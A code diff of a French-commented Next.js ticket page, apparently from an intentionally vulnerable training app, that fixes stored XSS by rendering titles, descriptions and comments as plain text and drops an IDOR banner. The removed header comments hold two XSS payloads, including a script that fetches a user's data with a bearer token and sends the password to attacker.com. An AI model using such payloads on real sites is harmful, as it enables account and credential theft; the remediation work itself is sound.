@@ -1,10 +1,4 @@
 "use client";
-// ⚠️  VULN: XSS Stocké — le titre, la description et les commentaires sont injectés
-//          via dangerouslySetInnerHTML sans aucune sanitisation
-// CWE-79 / OWASP A03:2021
-//
-// Payload test: <img src=x onerror="alert(document.cookie)">
-// Payload avancé: <script>fetch('/api/users/1',{headers:{Authorization:'Bearer '+localStorage.token}}).then(r=>r.json()).then(d=>fetch('https://attacker.com?p='+d.user.password))</script>
 
 import { useEffect, useState } from "react";
 import { useRouter } from "next/navigation";
@@ -75,17 +69,13 @@ export default function TicketDetailPage({ params }) {
                 <span className="text-xs bg-orange-100 text-orange-700 px-2 py-0.5 rounded-full">{ticket.priority}</span>
               </div>
 
-              {/* ⚠️  XSS — titre rendu en HTML brut */}
-              <h1
-                className="text-xl font-bold text-gray-900 mb-3"
-                dangerouslySetInnerHTML={{ __html: ticket.title }}
-              />
-
-              {/* ⚠️  XSS — description rendue en HTML brut */}
-              <div
-                className="text-gray-600 text-sm leading-relaxed"
-                dangerouslySetInnerHTML={{ __html: ticket.description }}
-              />
+              {/* FIX VLN-03: rendu texte React — pas d'interprétation HTML */}
+              <h1 className="text-xl font-bold text-gray-900 mb-3">
+                {ticket.title}
+              </h1>
+              <p className="text-gray-600 text-sm leading-relaxed whitespace-pre-wrap">
+                {ticket.description}
+              </p>
             </div>
             <button
               onClick={deleteTicket}
@@ -98,9 +88,6 @@ export default function TicketDetailPage({ params }) {
           <div className="text-xs text-gray-400 border-t pt-3">
             Créé par <span className="font-medium">{ticket.author_name}</span> le{" "}
             {new Date(ticket.created_at).toLocaleDateString("fr-FR")}
-            {user && ticket.user_id !== user.id && (
-              <span className="ml-2 text-red-500 font-medium">⚠️ Ce ticket appartient à un autre utilisateur (IDOR)</span>
-            )}
           </div>
         </div>
 
@@ -114,11 +101,8 @@ export default function TicketDetailPage({ params }) {
                   <span className="font-medium text-gray-600">{c.username}</span> —{" "}
                   {new Date(c.created_at).toLocaleString("fr-FR")}
                 </div>
-                {/* ⚠️  XSS Stocké — commentaire rendu en HTML brut */}
-                <div
-                  className="text-sm text-gray-700"
-                  dangerouslySetInnerHTML={{ __html: c.content }}
-                />
+                {/* FIX VLN-03: texte brut, React échappe automatiquement */}
+                <p className="text-sm text-gray-700 whitespace-pre-wrap">{c.content}</p>
               </div>
             ))}
             {comments.length === 0 && <p className="text-gray-400 text-sm">Aucun commentaire.</p>}
@@ -128,7 +112,7 @@ export default function TicketDetailPage({ params }) {
             <input
               value={comment}
               onChange={(e) => setComment(e.target.value)}
-              placeholder="Ajouter un commentaire... (HTML accepté ⚠️)"
+              placeholder="Ajouter un commentaire..."
               className="flex-1 border border-gray-300 rounded-lg px-3 py-2 text-sm focus:ring-2 focus:ring-blue-500 outline-none"
             />
             <button type="submit" className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm font-medium hover:bg-blue-700">
